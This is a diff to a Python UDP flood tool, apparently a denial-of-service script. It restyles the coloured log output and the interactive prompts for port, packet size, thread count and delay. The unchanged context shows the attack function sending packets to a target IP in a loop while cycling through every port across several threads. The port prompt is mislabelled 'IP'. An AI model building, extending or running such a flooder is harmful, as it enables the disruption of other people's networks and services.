@@ -52,7 +52,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
             sock.sendto(data, (ip, port))
             sent += 1
             log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip} \033[33mport:\033[37m{port} \033[36mSent•> \033[37m{sent} \033[94mthreads\033[38;5;220m•> {threading.get_ident()}")
-            log_message(f"\033[38;5;220mIp Address\033[94m•> {ip} \033[37mport:\033[32m{port} \033[94mSent•> \033[31m{sent} \033[93mpacket_size\033[37m•> {packet_size}")
+            log_message(f"\033[38;5;220mIp Address\033[38;5;39m•> {ip} \033[37mport:\033[32m{port} \033[94mSent•> \033[31m{sent} \033[93mpacket_size\033[37m•> {packet_size}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
@@ -72,10 +72,11 @@ def main():
         sys.exit(1)
 
     try:
-        port = int(input("\033[33m==⟩ IP [default 80]: \033[32m").strip() or 80)
-        packet_size = int(input("\033[33m==⟩ Size [default 1490 bytes]: \033[32m").strip() or 1490)
-        threads = int(input("\033[33m==⟩ Number Of threads [default 4]: \033[32m").strip() or 4)
-        rate_limit = float(input("\033[33m==⟩ Duration [seconds]: \033[32m").strip() or 0.01)
+        print("┏━━━⬣")
+        port = int(input("\033[33m┗━> IP [default 80]: \033[32m").strip() or 80)
+        packet_size = int(input("\033[33m┗━> Size [default 1490 bytes]: \033[32m").strip() or 1490)
+        threads = int(input("\033[33m┗━> Number Of threads [default 4]: \033[32m").strip() or 4)
+        rate_limit = float(input("\033[33m┗━> Duration [seconds]: \033[32m").strip() or 0.01)
     except ValueError:
         log_message("Invalid input provided. Exiting...")
         sys.exit(1)
